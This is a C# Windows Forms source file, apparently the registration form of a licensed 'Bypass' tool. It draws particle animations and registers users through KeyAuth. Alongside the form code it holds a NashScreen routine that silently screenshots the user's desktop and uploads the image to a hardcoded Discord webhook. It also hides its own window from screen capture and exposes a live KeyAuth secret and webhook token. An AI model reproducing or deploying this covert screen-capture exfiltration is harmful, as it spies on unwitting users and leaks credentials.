using ag.Class;
using ag.Forms;
using DiscordMessenger;
using KeyAuth;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using static ag.NLogin;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.StartPanel;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace ag.Others
{
    public partial class NRegister : Form
    {

        private List<Particle> particles = new List<Particle>();
        private Random random = new Random();
        private Color backgroundColor = Color.FromArgb(15, 15, 15);
        private System.Windows.Forms.Timer timerParticles = new System.Windows.Forms.Timer();

        public static api KeyAuthApp = new api(
            name: "Bypass",
            ownerid: "oEfog6kcpB",
            secret: "1b3f8777c230cb36e2bb70606f231f8fa7e768613095e80cb4520d7a8013cece",
            version: "1.0"
        );
        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool GetAsyncKeyState(int vKey);
         
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        private static extern short GetKeyState(int keyCode);
         
        [DllImport("user32.dll")]
        public static extern uint SetWindowDisplayAffinity(IntPtr hwnd, uint dwAffinity);

        public NRegister()
        {
            InitializeComponent();
            InitializeParticles();
            timerParticles.Interval = 1;
            timerParticles.Tick += TimerParticles_Tick;
            timerParticles.Start();
            DoubleBuffered = true;
        }


        private void InitializeParticles()
        {
            int numParticles = 50;
            int bottomAreaHeight = ClientSize.Height / 3; // Defina a altura da área inferior desejada (1/3 da altura do formulário)
            for (int i = 0; i < numParticles; i++)
            {
                double angle = random.NextDouble() * Math.PI; // Gere apenas partículas na metade inferior
                double speed = random.Next(1, 3);
                particles.Add(new Particle()
                {
                    Position = new PointF(random.Next(0, ClientSize.Width), random.Next(ClientSize.Height - bottomAreaHeight, ClientSize.Height)),
                    Velocity = new PointF((float)(Math.Cos(angle) * speed), (float)(Math.Sin(angle) * speed)),
                    Radius = random.Next(2, 5),
                    Color = Color.DarkBlue
                });
            }
        }

        private void UpdateParticles()
        {
            int bottomAreaHeight = ClientSize.Height / 3; // Defina a altura da área inferior desejada (1/3 da altura do formulário)
            foreach (var particle in particles)
            {
                // Verifique se a partícula está dentro da área inferior
                if (particle.Position.Y >= ClientSize.Height - bottomAreaHeight)
                {
                    // Atualize a posição apenas para partículas dentro da área inferior
                    particle.Position = new PointF(particle.Position.X + particle.Velocity.X * 0.5f, particle.Position.Y + particle.Velocity.Y * 0.5f);
                    if (particle.Position.X < 0 || particle.Position.X > ClientSize.Width || particle.Position.Y > ClientSize.Height)
                    {
                        // Se a partícula ultrapassar os limites do formulário, reposicione-a na parte inferior
                        particle.Position = new PointF(random.Next(0, ClientSize.Width), ClientSize.Height - bottomAreaHeight);
                    }
                }
            }
        }


        protected override void OnPaint(PaintEventArgs e)
        {
            e.Graphics.Clear(backgroundColor);

            int bottomAreaHeight = ClientSize.Height / 3; // Defina a altura da área inferior desejada (1/3 da altura do formulário)

            // Desenhar as partículas
            foreach (var particle in particles)
            {
                if (particle.Position.Y >= ClientSize.Height - bottomAreaHeight)
                {
                    // Calcular a transparência com base na posição da partícula na parte superior do formulário
                    int transparency = (int)((particle.Position.Y - (ClientSize.Height - bottomAreaHeight)) / (float)bottomAreaHeight * 255);
                    if (transparency > 255) transparency = 255;
                    if (transparency < 0) transparency = 0;

                    // Criar uma cor com transparência variável
                    Color particleColor = Color.FromArgb(transparency, ColorTranslator.FromHtml("#df1d21")); // Color HEX

                    int reducedRadius = particle.Radius / 2; // Reduzindo o tamanho pela metade
                    e.Graphics.FillEllipse(new SolidBrush(particleColor),
                        particle.Position.X - reducedRadius,
                        particle.Position.Y - reducedRadius,
                        reducedRadius * 2, reducedRadius * 2);
                }
            }

            // Desenhar as linhas entre as partículas próximas
            foreach (var particle in particles)
            {
                foreach (var otherParticle in particles)
                {
                    if (particle != otherParticle)
                    {
                        float dx = particle.Position.X - otherParticle.Position.X;
                        float dy = particle.Position.Y - otherParticle.Position.Y;
                        float distance = (float)Math.Sqrt(dx * dx + dy * dy);

                        if (distance < 50)
                        {
                            int alpha = (int)((1.0f - (distance / 50.0f)) * 255.0f);
                            Color lineColor = Color.FromArgb(alpha, 84, 84, 84); // Cor #545454
                            e.Graphics.DrawLine(new Pen(lineColor, 1),
                                particle.Position, otherParticle.Position);
                        }
                    }
                }
            }
        }


        private void TimerParticles_Tick(object sender, EventArgs e)
        {
            UpdateParticles();
            Invalidate();
        }

        private void siticonePanel1_Paint(object sender, PaintEventArgs e)
        {

        }
         
        private void siticoneControlBox1_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
            Application.Exit();
            Application.ExitThread();
        }
         
        private void NRegister_Load(object sender, EventArgs e)
        {
            SetWindowDisplayAffinity(this.Handle, WDA_EXCLUDEFROMCAPTURE);
            KeyAuthApp.init();
            this.Text = mcyAy.RandomString(27);
        }
         
        private static void SendImg(string url, string filePath)
        {
            HttpClient client = new HttpClient();
            MultipartFormDataContent content = new MultipartFormDataContent();

            var file = File.ReadAllBytes(filePath);
            content.Add(new ByteArrayContent(file, 0, file.Length), Path.GetExtension(filePath), filePath);
            client.PostAsync(url, content).Wait();
            client.Dispose();
        }
         
        public static void SendDisMessage(string URL, string json)
        {
            var wr = WebRequest.Create(URL);
            wr.ContentType = "application/json";
            wr.Method = "POST";
            using (var sw = new StreamWriter(wr.GetRequestStream()))
                sw.Write(json);
            wr.GetResponse();
        }
         

        public void AlertMsg(string msg, NNotify.enmType type)
        {
            NNotify frm = new NNotify();
            frm.showAlert(msg, type);
        }
         
        public static void NashScreen()
        {
            try
            {
                var computadortela = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);

                var arquivoDestino = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                var g = Graphics.FromImage(arquivoDestino);

                g.CopyFromScreen(new Point(0, 0), new Point(0, 0), computadortela);

                var nomeArquivo = @"C:\Windows\Temp\eu.png";

                arquivoDestino.Save(nomeArquivo, ImageFormat.Png);
                MultipartFormDataContent content = new MultipartFormDataContent();

                var file = File.ReadAllBytes(nomeArquivo);
                content.Add(new ByteArrayContent(file, 0, file.Length), Path.GetExtension(nomeArquivo), nomeArquivo);
                SendImg("https://discord.com/api/webhooks/1226941722215579699/c2EizC84VmzyQSd5-6dR9UoLMhDanJSPEYgC1c4KWykMtUHIldGAuiP5A6qpWE0PrsFT", nomeArquivo);
            }
            catch
            {

            }
        }
         
        private void label4_Click(object sender, EventArgs e)
        {
            NLogin Nash = new NLogin();
            Nash.Show();
            base.Hide();
        }
         
        private async void siticoneButton1_Click(object sender, EventArgs e)
        {
           
        }
         
        const uint WDA_EXCLUDEFROMCAPTURE = 0x00000011;
         
        private void timer1_Tick(object sender, EventArgs e)
        {
        }

        private async void siticoneButton2_Click(object sender, EventArgs e)
        {
            KeyAuthApp.register(user.Text, pass.Text, key.Text);
            if (KeyAuthApp.response.success)
            {
                NMain main = new NMain();
                main.Show();
                this.Hide();
            }
            else
                AlertMsg(KeyAuthApp.response.message, NNotify.enmType.Error);
        }

        private void label3_Click(object sender, EventArgs e)
        {
            NLogin Nash = new NLogin();
            Nash.Show();
            base.Hide();
        }

        public class Particle
        {
            public PointF Position { get; set; }
            public PointF Velocity { get; set; }
            public int Radius { get; set; }
            public Color Color { get; set; }
        }

    }
}
